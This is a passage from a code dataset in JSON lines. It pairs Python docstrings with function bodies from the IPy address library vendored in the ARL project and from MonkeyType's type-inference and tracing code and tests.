print(_parseAddressIPv6('FF01::43'))\n338958331222012082418099330867817087043\n>>> print(_parseAddressIPv6('0:0:0:0:0:0:13.1.68.3'))\n218186755\n>>> print(_parseAddressIPv6('::13.1.68.3'))\n218186755\n>>> print(_parseAddressIPv6('0:0:0:0:0:FFFF:129.144.52.38'))\n281472855454758\n>>> print(_parseAddressIPv6('::FFFF:129.144.52.38'))\n281472855454758\n>>> print(_parseAddressIPv6('1080:0:0:0:8:800:200C:417A'))\n21932261930451111902915077091070067066\n>>> print(_parseAddressIPv6('1080::8:800:200C:417A'))\n21932261930451111902915077091070067066\n>>> print(_parseAddressIPv6('::1:2:3:4:5:6'))\n1208962713947218704138246\n>>> print(_parseAddressIPv6('1:2:3:4:5:6::'))\n5192455318486707404433266432802816\n\"\"\"\n\n# Split string into a list, example:\n#   '1080:200C::417A' => ['1080', '200C', '417A'] and fill_pos=2\n# and fill_pos is the position of '::' in the list\n", "func_signal": "def _parseAddressIPv6(ipstr):\n", "code": "items = []\nindex = 0\nfill_pos = None\nwhile index < len(ipstr):\n    text = ipstr[index:]\n    if text.startswith(\"::\"):\n        if fill_pos is not None:\n            # Invalid IPv6, eg. '1::2::'\n            raise ValueError(\"%r: Invalid IPv6 address: more than one '::'\" % ipstr)\n        fill_pos = len(items)\n        index += 2\n        continue\n    pos = text.find(':')\n    if pos == 0:\n        # Invalid IPv6, eg. '1::2:'\n        raise ValueError(\"%r: Invalid IPv6 address\" % ipstr)\n    if pos != -1:\n        items.append(text[:pos])\n        if text[pos:pos + 2] == \"::\":\n            index += pos\n        else:\n            index += pos + 1\n\n        if index == len(ipstr):\n            # Invalid IPv6, eg. '1::2:'\n            raise ValueError(\"%r: Invalid IPv6 address\" % ipstr)\n    else:\n        items.append(text)\n        break\n\nif items and '.' in items[-1]:\n    # IPv6 ending with IPv4 like '::ffff:192.168.0.1'\n    if (fill_pos is not None) and not (fill_pos <= len(items) - 1):\n        # Invalid IPv6: 'ffff:192.168.0.1::'\n        raise ValueError(\"%r: Invalid IPv6 address: '::' after IPv4\" % ipstr)\n    value = parseAddress(items[-1])[0]\n    items = items[:-1] + [\"%04x\" % (value >> 16), \"%04x\" % (value & 0xffff)]\n\n# Expand fill_pos to fill with '0'\n# ['1','2'] with fill_pos=1 => ['1', '0', '0', '0', '0', '0', '0', '2']\nif fill_pos is not None:\n    diff = 8 - len(items)\n    if diff <= 0:\n        raise ValueError(\"%r: Invalid IPv6 address: '::' is not needed\" % ipstr)\n    items = items[:fill_pos] + ['0'] * diff + items[fill_pos:]\n\n# Here we have a list of 8 strings\nif len(items) != 8:\n    # Invalid IPv6, eg. '1:2:3'\n    raise ValueError(\"%r: Invalid IPv6 address: should have 8 hextets\" % ipstr)\n\n# Convert strings to long integer\nvalue = 0\nindex = 0\nfor item in items:\n    try:\n        item = int(item, 16)\n        error = not (0 <= item <= 0xffff)\n    except ValueError:\n        error = True\n    if error:\n        raise ValueError(\"%r: Invalid IPv6 address: invalid hexlet %r\" % (ipstr, item))\n    value = (value << 16) + item\n    index += 1\nreturn value", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"\nParse a string and return the corresponding IP address (as integer)\nand a guess of the IP version.\n\nFollowing address formats are recognized:\n\n>>> def testParseAddress(address):\n...     ip, version = parseAddress(address)\n...     print((\"%s (IPv%s)\" % (ip, version)))\n...\n>>> testParseAddress('0x0123456789abcdef')           # IPv4 if <= 0xffffffff else IPv6\n81985529216486895 (IPv6)\n>>> testParseAddress('123.123.123.123')              # IPv4\n2071690107 (IPv4)\n>>> testParseAddress('123.123')                      # 0-padded IPv4\n2071658496 (IPv4)\n>>> testParseAddress('127')\n2130706432 (IPv4)\n>>> testParseAddress('255')\n4278190080 (IPv4)\n>>> testParseAddress('256')\n256 (IPv4)\n>>> testParseAddress('108000000000000000080800200C417A')\n21932261930451111902915077091070067066 (IPv6)\n>>> testParseAddress('0x108000000000000000080800200C417A')\n21932261930451111902915077091070067066 (IPv6)\n>>> testParseAddress('1080:0000:0000:0000:0008:0800:200C:417A')\n21932261930451111902915077091070067066 (IPv6)\n>>> testParseAddress('1080:0:0:0:8:800:200C:417A')\n21932261930451111902915077091070067066 (IPv6)\n>>> testParseAddress('1080:0::8:800:200C:417A')\n21932261930451111902915077091070067066 (IPv6)\n>>> testParseAddress('::1')\n1 (IPv6)\n>>> testParseAddress('::')\n0 (IPv6)\n>>> testParseAddress('0:0:0:0:0:FFFF:129.144.52.38')\n281472855454758 (IPv6)\n>>> testParseAddress('::13.1.68.3')\n218186755 (IPv6)\n>>> testParseAddress('::FFFF:129.144.52.38')\n281472855454758 (IPv6)\n\"\"\"\n\n", "func_signal": "def parseAddress(ipstr, ipversion=0):\n", "code": "try:\n    hexval = int(ipstr, 16)\nexcept ValueError:\n    hexval = None\ntry:\n    intval = int(ipstr, 10)\nexcept ValueError:\n    intval = None\n\nif ipstr.startswith('0x') and hexval is not None:\n    if hexval > MAX_IPV6_ADDRESS:\n        raise ValueError(\"IP Address can't be larger than %x: %x\" % (MAX_IPV6_ADDRESS, hexval))\n    if hexval <= MAX_IPV4_ADDRESS:\n        return (hexval, 4)\n    else:\n        return (hexval, 6)\n\nif ipstr.find(':') != -1:\n    return (_parseAddressIPv6(ipstr), 6)\n\nelif len(ipstr) == 32 and hexval is not None:\n    # assume IPv6 in pure hexadecimal notation\n    return (hexval, 6)\n\nelif ipstr.find('.') != -1 or (intval is not None and intval < 256 and ipversion != 6):\n    # assume IPv4  ('127' gets interpreted as '127.0.0.0')\n    bytes = ipstr.split('.')\n    if len(bytes) > 4:\n        raise ValueError(\"IPv4 Address with more than 4 bytes\")\n    bytes += ['0'] * (4 - len(bytes))\n    bytes = [int(x) for x in bytes]\n    for x in bytes:\n        if x > 255 or x < 0:\n            raise ValueError(\"%r: single byte must be 0 <= byte < 256\" % (ipstr))\n    return ((bytes[0] << 24) + (bytes[1] << 16) + (bytes[2] << 8) + bytes[3], 4)\n\nelif intval is not None:\n    # we try to interprete it as a decimal digit -\n    # this ony works for numbers > 255 ... others\n    # will be interpreted as IPv4 first byte\n    if intval > MAX_IPV6_ADDRESS:\n        raise ValueError(\"IP Address can't be larger than %x: %x\" % (MAX_IPV6_ADDRESS, intval))\n    if intval <= MAX_IPV4_ADDRESS and ipversion != 6:\n        return (intval, 4)\n    else:\n        return (intval, 6)\n\nraise ValueError(\"IP Address format was invalid: %s\" % ipstr)", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Return the value for reverse lookup/PTR records as RFC 2317 look alike.\n\nRFC 2317 is an ugly hack which only works for sub-/24 e.g. not\nfor /23. Do not use it. Better set up a zone for every\naddress. See reverseName for a way to achieve that.\n\n>>> print(IP('195.185.1.1').reverseName())\n1.1.185.195.in-addr.arpa.\n>>> print(IP('195.185.1.0/28').reverseName())\n0-15.1.185.195.in-addr.arpa.\n>>> IP('::1:2').reverseName()\n'2.0.0.0.1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa.'\n>>> IP('ff02::/64').reverseName()\n'0.0.0.0.0.0.0.0.0.0.0.0.2.0.f.f.ip6.arpa.'\n\"\"\"\n\n", "func_signal": "def reverseName(self):\n", "code": "if self._ipversion == 4:\n    s = self.strFullsize(0)\n    s = s.split('.')\n    s.reverse()\n    first_byte_index = int(4 - (self._prefixlen // 8))\n    if self._prefixlen % 8 != 0:\n        nibblepart = \"%s-%s\" % (\n        s[3 - (self._prefixlen // 8)], intToIp(self.ip + self.len() - 1, 4).split('.')[-1])\n        nibblepart += '.'\n    else:\n        nibblepart = \"\"\n\n    s = '.'.join(s[first_byte_index:])\n    return \"%s%s.in-addr.arpa.\" % (nibblepart, s)\n\nelif self._ipversion == 6:\n    ipv4 = self._getIPv4Map()\n    if ipv4 is not None:\n        return ipv4.reverseName()\n    s = '%032x' % self.ip\n    if self._prefixlen % 4 != 0:\n        nibblepart = \"%s-%x\" % (s[self._prefixlen:], self.ip + self.len() - 1)\n        nibblepart += '.'\n    else:\n        nibblepart = \"\"\n    s = list(s)\n    s.reverse()\n    s = '.'.join(s)\n    first_nibble_index = int(32 - (self._prefixlen // 4)) * 2\n    return \"%s%s.ip6.arpa.\" % (nibblepart, s[first_nibble_index:])\nelse:\n    raise ValueError(\"only IPv4 and IPv6 supported\")", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Return the length of a subnet.\n\n>>> print(IP('195.185.1.0/28').len())\n16\n>>> print(IP('195.185.1.0/24').len())\n256\n\"\"\"\n\n", "func_signal": "def len(self):\n", "code": "bits = _ipVersionToLen(self._ipversion)\nlocallen = bits - self._prefixlen\nreturn 2 ** locallen", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Transform an integer string into an IP address.\"\"\"\n\n# just to be sure and hoping for Python 2.2\n", "func_signal": "def intToIp(ip, version):\n", "code": "ip = int(ip)\n\nif ip < 0:\n    raise ValueError(\"IPs can't be negative: %d\" % (ip))\n\nret = ''\nif version == 4:\n    if ip > MAX_IPV4_ADDRESS:\n        raise ValueError(\"IPv4 Address can't be larger than %x: %x\" % (MAX_IPV4_ADDRESS, ip))\n    for l in xrange(4):\n        ret = str(ip & 0xff) + '.' + ret\n        ip = ip >> 8\n    ret = ret[:-1]\nelif version == 6:\n    if ip > MAX_IPV6_ADDRESS:\n        raise ValueError(\"IPv6 Address can't be larger than %x: %x\" % (MAX_IPV6_ADDRESS, ip))\n    l = \"%032x\" % ip\n    for x in xrange(1, 33):\n        ret = l[-x] + ret\n        if x % 4 == 0:\n            ret = ':' + ret\n    ret = ret[1:]\nelse:\n    raise ValueError(\"only IPv4 and IPv6 supported\")\n\nreturn ret", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Return a string representation in compressed format using '::' Notation.\n\n>>> IP('127.0.0.1').strCompressed()\n'127.0.0.1'\n>>> IP('2001:0658:022a:cafe:0200::1').strCompressed()\n'2001:658:22a:cafe:200::1'\n>>> IP('ffff:ffff:ffff:ffff:ffff:f:f:fffc/127').strCompressed()\n'ffff:ffff:ffff:ffff:ffff:f:f:fffc/127'\n\"\"\"\n\n", "func_signal": "def strCompressed(self, wantprefixlen=None):\n", "code": "if self.WantPrefixLen == None and wantprefixlen == None:\n    wantprefixlen = 1\n\nif self._ipversion == 4:\n    return self.strFullsize(wantprefixlen)\nelse:\n    if self.ip >> 32 == 0xffff:\n        ipv4 = intToIp(self.ip & MAX_IPV4_ADDRESS, 4)\n        text = \"::ffff:\" + ipv4 + self._printPrefix(wantprefixlen)\n        return text\n    # find the longest sequence of '0'\n    hextets = [int(x, 16) for x in self.strFullsize(0).split(':')]\n    # every element of followingzeros will contain the number of zeros\n    # following the corresponding element of hextets\n    followingzeros = [0] * 8\n    for i in xrange(len(hextets)):\n        followingzeros[i] = _countFollowingZeros(hextets[i:])\n    # compressionpos is the position where we can start removing zeros\n    compressionpos = followingzeros.index(max(followingzeros))\n    if max(followingzeros) > 1:\n        # genererate string with the longest number of zeros cut out\n        # now we need hextets as strings\n        hextets = [x for x in self.strNormal(0).split(':')]\n        while compressionpos < len(hextets) and hextets[compressionpos] == '0':\n            del (hextets[compressionpos])\n        hextets.insert(compressionpos, '')\n        if compressionpos + 1 >= len(hextets):\n            hextets.append('')\n        if compressionpos == 0:\n            hextets = [''] + hextets\n        return ':'.join(hextets) + self._printPrefix(wantprefixlen)\n    else:\n        return self.strNormal(0) + self._printPrefix(wantprefixlen)", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Return a string representation as a binary value.\n\n>>> print(IP('127.0.0.1').strBin())\n01111111000000000000000000000001\n>>> print(IP('2001:0658:022a:cafe:0200::1').strBin())\n00100000000000010000011001011000000000100010101011001010111111100000001000000000000000000000000000000000000000000000000000000001\n\"\"\"\n\n", "func_signal": "def strBin(self, wantprefixlen=None):\n", "code": "bits = _ipVersionToLen(self._ipversion)\nif self.WantPrefixLen == None and wantprefixlen == None:\n    wantprefixlen = 0\nret = _intToBin(self.ip)\nreturn '0' * (bits - len(ret)) + ret + self._printPrefix(wantprefixlen)", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Check the validity of a prefix\n\nChecks if the variant part of a prefix only has 0s, and the length is\ncorrect.\n\n>>> _checkPrefix(0x7f000000, 24, 4)\n1\n>>> _checkPrefix(0x7f000001, 24, 4)\n0\n>>> repr(_checkPrefix(0x7f000001, -1, 4))\n'None'\n>>> repr(_checkPrefix(0x7f000001, 33, 4))\n'None'\n\"\"\"\n\n# TODO: unify this v4/v6/invalid code in a function\n", "func_signal": "def _checkPrefix(ip, prefixlen, version):\n", "code": "bits = _ipVersionToLen(version)\n\nif prefixlen < 0 or prefixlen > bits:\n    return None\n\nif ip == 0:\n    zbits = bits + 1\nelse:\n    zbits = _count0Bits(ip)\nif zbits < bits - prefixlen:\n    return 0\nelse:\n    return 1", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Return a mask of n bits as a long integer.\n\nFrom 'IP address conversion functions with the builtin socket module'\nby Alex Martelli\nhttp://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/66517\n\"\"\"\n", "func_signal": "def _prefixlenToNetmask(prefixlen, version):\n", "code": "if prefixlen == 0:\n    return 0\nelif prefixlen < 0:\n    raise ValueError(\"Prefixlen must be > 0\")\nreturn ((2 << prefixlen - 1) - 1) << (_ipVersionToLen(version) - prefixlen)", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Check if two IP address ranges overlap.\n\nReturns 0 if the two ranges don't overlap, 1 if the given\nrange overlaps at the end and -1 if it does at the beginning.\n\n>>> IP('192.168.0.0/23').overlaps('192.168.1.0/24')\n1\n>>> IP('192.168.0.0/23').overlaps('192.168.1.255')\n1\n>>> IP('192.168.0.0/23').overlaps('192.168.2.0')\n0\n>>> IP('192.168.1.0/24').overlaps('192.168.0.0/23')\n-1\n\"\"\"\n\n", "func_signal": "def overlaps(self, item):\n", "code": "if not isinstance(item, IP):\n    item = IP(item)\nif item.ip >= self.ip and item.ip < self.ip + self.len():\n    return 1\nelif self.ip >= item.ip and self.ip < item.ip + item.len():\n    return -1\nelse:\n    return 0", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Called to implement evaluation of self[key].\n\n>>> ip=IP('127.0.0.0/30')\n>>> for x in ip:\n...  print(repr(x))\n...\nIP('127.0.0.0')\nIP('127.0.0.1')\nIP('127.0.0.2')\nIP('127.0.0.3')\n>>> ip[2]\nIP('127.0.0.2')\n>>> ip[-1]\nIP('127.0.0.3')\n\"\"\"\n\n", "func_signal": "def __getitem__(self, key):\n", "code": "if isinstance(key, slice):\n    return [self.ip + int(x) for x in xrange(*key.indices(len(self)))]\nif not isinstance(key, INT_TYPES):\n    raise TypeError\nif key < 0:\n    if abs(key) <= self.len():\n        key = self.len() - abs(key)\n    else:\n        raise IndexError\nelse:\n    if key >= self.len():\n        raise IndexError\n\nreturn self.ip + int(key)", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Return number of elements containing 0 at the beginning of the list.\"\"\"\n", "func_signal": "def _countFollowingZeros(l):\n", "code": "if len(l) == 0:\n    return 0\nelif l[0] != 0:\n    return 0\nelse:\n    return 1 + _countFollowingZeros(l[1:])", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"\nReturns the IPv6 mapped address of an IPv4 address, or the corresponding\nIPv4 address if the IPv6 address is in the appropriate range.\nRaises a ValueError if the IPv6 address is not translatable. See RFC 4291.\n\n>>> IP('192.168.1.1').v46map()\nIP('::ffff:192.168.1.1')\n>>> IP('::ffff:192.168.1.1').v46map()\nIP('192.168.1.1')\n\"\"\"\n", "func_signal": "def v46map(self):\n", "code": "if self._ipversion == 4:\n    return IP(str(IPV6_MAP_MASK + self.ip) +\n              \"/%s\" % (self._prefixlen + 96))\nelse:\n    if self.ip & IPV6_TEST_MAP == IPV6_MAP_MASK:\n        return IP(str(self.ip - IPV6_MAP_MASK) +\n                  \"/%s\" % (self._prefixlen - 96))\nraise ValueError(\"%s cannot be converted to an IPv4 address.\"\n                 % repr(self))", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"If supplied, the code filter should decide which code objects are traced\"\"\"\n", "func_signal": "def test_filtering(self, collector):\n", "code": "with trace_calls(collector, max_typed_dict_size=0, code_filter=lambda code: code.co_name == 'simple_add'):\n    simple_add(1, 2)\n    explicit_return_none()\nassert collector.traces == [CallTrace(simple_add, {'a': int, 'b': int}, int)]", "path": "MonkeyType/tests/test_tracing.py", "commit_date": "2020-03-29 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"By default we store traces in a local SQLite database.\n\nThe path to this database file can be customized via the `MT_DB_PATH`\nenvironment variable.\n\"\"\"\n", "func_signal": "def trace_store(self) -> CallTraceStore:\n", "code": "db_path = os.environ.get(self.DB_PATH_VAR, \"monkeytype.sqlite3\")\nreturn SQLiteStore.make_store(db_path)", "path": "MonkeyType/monkeytype/config.py", "commit_date": "2019-12-02 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"We should be able to look up properties that are only getters\"\"\"\n", "func_signal": "def test_get_property(self):\n", "code": "func = Dummy.a_property.fget\nobj = get_func_in_module(func.__module__, func.__qualname__)\nassert obj == func", "path": "MonkeyType/tests/test_util.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Check that we can dig through Cython wrappers in looking for methods.\n\nAs long as the Cython decorator sets __wrapped__ correctly, anyway.\n\"\"\"\n", "func_signal": "def test_cython_wrapper(self, collector):\n", "code": "cython_test_obj = CythonTest()\nwith trace_calls(collector, max_typed_dict_size=0):\n    cython_test_obj.cython_testfunc()\n\ntrace = CallTrace(cython_test_obj.cython_testfunc.__wrapped__, {'self': CythonTest}, int)\nassert trace in collector.traces", "path": "MonkeyType/tests/test_tracing.py", "commit_date": "2020-03-29 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Raise an error if lookup returns something that isn't a function\"\"\"\n", "func_signal": "def test_get_non_function(self):\n", "code": "with pytest.raises(InvalidTypeError):\n    get_func_in_module(__name__, 'NOT_A_FUNCTION')", "path": "MonkeyType/tests/test_util.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Regression test for applying stubs to testmodule/__init__.py style module layout\"\"\"\n", "func_signal": "def test_apply_stub_init(store, db_file, stdout, stderr, collector):\n", "code": "with trace_calls(collector, max_typed_dict_size=0):\n    func_foo()\n\nstore.add(collector.traces)\n\nwith mock.patch.dict(os.environ, {DefaultConfig.DB_PATH_VAR: db_file.name}):\n    ret = cli.main(['apply', Foo.__module__], stdout, stderr)\n\nassert ret == 0\nassert 'def __init__(self, arg1: str, arg2: int) -> None:' in stdout.getvalue()", "path": "MonkeyType/tests/test_cli.py", "commit_date": "2020-05-16 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"List of traced modules from the backing store\"\"\"\n", "func_signal": "def list_modules(self) -> List[str]:\n", "code": "raise NotImplementedError(\n    f\"Your CallTraceStore ({self.__class__.__module__}.{self.__class__.__name__}) \"\n    f\"does not implement list_modules()\"\n)", "path": "MonkeyType/monkeytype/db/base.py", "commit_date": "2018-02-13 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Check that function lookup does not invoke custom descriptors.\n\nLazyValue is an interesting corner case. Internally, LazyValue stores a\nfunction and its arguments. When LazyValue.value is accessed for the\nfirst time, the stored function will be invoked, and its return value\nwill be set as the value of LazyValue.value. Additionally, and this is\nimportant, the reference to the stored function and its arguments are\ncleared.\n\nWhen tracing, accessing LazyValue.value generates a 'call' event for a\nfunction named 'value'.  At the point where we receive the call event,\nthe LazyValue.value function is about to begin execution. If we attempt\nto find the called function using getattr, value will be invoked again,\nand the reference to the stored function and its arguments will be\ncleared.  At this point the original call to LazyValue.value will\nresume execution, however, the stored arguments will have been cleared,\nand the attempt to invoke the stored function will fail.\n\"\"\"\n", "func_signal": "def test_lazy_value(self, collector):\n", "code": "lazy_val = LazyValue(explicit_return_none)\nwith trace_calls(collector, max_typed_dict_size=0):\n    lazy_val.value", "path": "MonkeyType/tests/test_tracing.py", "commit_date": "2020-03-29 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Union[Tuple[V, ..., V], Tuple[V, ..., V], ...] -> Tuple[V, ...]\"\"\"\n", "func_signal": "def _rewrite_to_tuple(self, union):\n", "code": "value_type = None\nfor t in union.__args__:\n    if not is_generic_of(t, Tuple):\n        return None\n    value_type = value_type or t.__args__[0]\n    if not all(vt is value_type for vt in t.__args__):\n        return None\nreturn Tuple[value_type, ...]", "path": "MonkeyType/monkeytype/typing.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Return the smallest type equivalent to Union[types].\nIf all the types are anonymous TypedDicts, shrink them ourselves.\nOtherwise, recursively turn the anonymous TypedDicts into Dicts.\nUnion will handle deduplicating types (both by equality and subtype relationships).\"\"\"\n", "func_signal": "def shrink_types(types, max_typed_dict_size):\n", "code": "types = tuple(types)\nif len(types) == 0:\n    return Any\nif all(is_anonymous_typed_dict(typ) for typ in types):\n    return shrink_typed_dict_types(types, max_typed_dict_size)\n# Don't rewrite anonymous TypedDict to Dict if the types are all the same,\n# such as [Tuple[TypedDict(...)], Tuple[TypedDict(...)]].\nif all(types_equal(typ, types[0]) for typ in types[1:]):\n    return types[0]\n\n# If they are all lists, shrink their argument types. This way, we avoid\n# rewriting heterogenous anonymous TypedDicts to Dict.\nif all(is_list(typ) for typ in types):\n    annotation = shrink_types((getattr(typ, '__args__')[0] for typ in types), max_typed_dict_size)\n    return List[annotation]\n\nall_dict_types = tuple(RewriteAnonymousTypedDictToDict().rewrite(typ) for typ in types)\nreturn Union[all_dict_types]", "path": "MonkeyType/monkeytype/typing.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Make sure we return the underlying function for boundmethods\"\"\"\n", "func_signal": "def test_get_method(self):\n", "code": "meth = Dummy.a_class_method\nobj = get_func_in_module(meth.__module__, meth.__qualname__)\nassert obj == meth.__func__", "path": "MonkeyType/tests/test_util.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Check that we correctly trace functions decorated with @property\"\"\"\n", "func_signal": "def test_access_property(self, collector):\n", "code": "o = Oracle()\nwith trace_calls(collector, max_typed_dict_size=0):\n    o.meaning_of_life\nassert collector.traces == [CallTrace(Oracle.meaning_of_life.fget, {'self': Oracle}, int)]", "path": "MonkeyType/tests/test_tracing.py", "commit_date": "2020-03-29 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Return the static type that would be used in a type hint\"\"\"\n", "func_signal": "def get_type(obj, max_typed_dict_size):\n", "code": "if isinstance(obj, type):\n    return Type[obj]\nelif isinstance(obj, _BUILTIN_CALLABLE_TYPES):\n    return Callable\nelif isinstance(obj, types.GeneratorType):\n    return Iterator[Any]\ntyp = type(obj)\nif typ is list:\n    elem_type = shrink_types((get_type(e, max_typed_dict_size) for e in obj), max_typed_dict_size)\n    return List[elem_type]\nelif typ is set:\n    elem_type = shrink_types((get_type(e, max_typed_dict_size) for e in obj), max_typed_dict_size)\n    return Set[elem_type]\nelif typ is dict:\n    return get_dict_type(obj, max_typed_dict_size)\nelif typ is defaultdict:\n    key_type = shrink_types((get_type(k, max_typed_dict_size) for k in obj.keys()), max_typed_dict_size)\n    val_type = shrink_types((get_type(v, max_typed_dict_size) for v in obj.values()), max_typed_dict_size)\n    return DefaultDict[key_type, val_type]\nelif typ is tuple:\n    return Tuple[tuple(get_type(e, max_typed_dict_size) for e in obj)]\nreturn typ", "path": "MonkeyType/monkeytype/typing.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Return the required and optional fields in the TypedDict.\"\"\"\n", "func_signal": "def field_annotations(typed_dict) -> Tuple[Dict[str, type], Dict[str, type]]:\n", "code": "return (typed_dict.__annotations__[\"required_fields\"].__annotations__,\n        typed_dict.__annotations__[\"optional_fields\"].__annotations__)", "path": "MonkeyType/monkeytype/typing.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Use monkeytype_config.CONFIG if it exists, otherwise DefaultConfig().\n\nmonkeytype_config is not a module that is part of the monkeytype\ndistribution, it must be created by the user.\n\"\"\"\n", "func_signal": "def get_default_config() -> Config:\n", "code": "try:\n    import monkeytype_config  # type: ignore\nexcept ImportError:\n    return DefaultConfig()\nreturn monkeytype_config.CONFIG", "path": "MonkeyType/monkeytype/config.py", "commit_date": "2019-12-02 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Wrapper for main() for setuptools console_script entry point.\"\"\"\n# Since monkeytype needs to import the user's code (and possibly config\n# code), the user's code must be on the Python path. But when running the\n# CLI script, it won't be. So we add the current working directory to the\n# Python path ourselves.\n", "func_signal": "def entry_point_main() -> 'NoReturn':\n", "code": "sys.path.insert(0, os.getcwd())\nsys.exit(main(sys.argv[1:], sys.stdout, sys.stderr))", "path": "MonkeyType/monkeytype/cli.py", "commit_date": "2020-05-16 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Return a TypedDict for `dct` if all the keys are strings.\nElse, default to the union of the keys and of the values.\"\"\"\n", "func_signal": "def get_dict_type(dct, max_typed_dict_size):\n", "code": "if len(dct) == 0:\n    # Special-case this because returning an empty TypedDict is\n    # unintuitive, especially when you've \"disabled\" TypedDict generation\n    # by setting `max_typed_dict_size` to 0.\n    return Dict[Any, Any]\nif (all(isinstance(k, str) for k in dct.keys())\n        and (max_typed_dict_size is None or len(dct) <= max_typed_dict_size)):\n    return make_typed_dict(required_fields={k: get_type(v, max_typed_dict_size) for k, v in dct.items()})\nelse:\n    key_type = shrink_types((get_type(k, max_typed_dict_size) for k in dct.keys()), max_typed_dict_size)\n    val_type = shrink_types((get_type(v, max_typed_dict_size) for v in dct.values()), max_typed_dict_size)\n    return Dict[key_type, val_type]", "path": "MonkeyType/monkeytype/typing.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"We should be able to look up properties that are decorated\nwith django.utils.functional.cached_property\"\"\"\n", "func_signal": "def test_get_cached_property(self):\n", "code": "func = Dummy.a_cached_property.func\nobj = get_func_in_module(func.__module__, func.__qualname__)\nassert obj == func", "path": "MonkeyType/tests/test_util.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
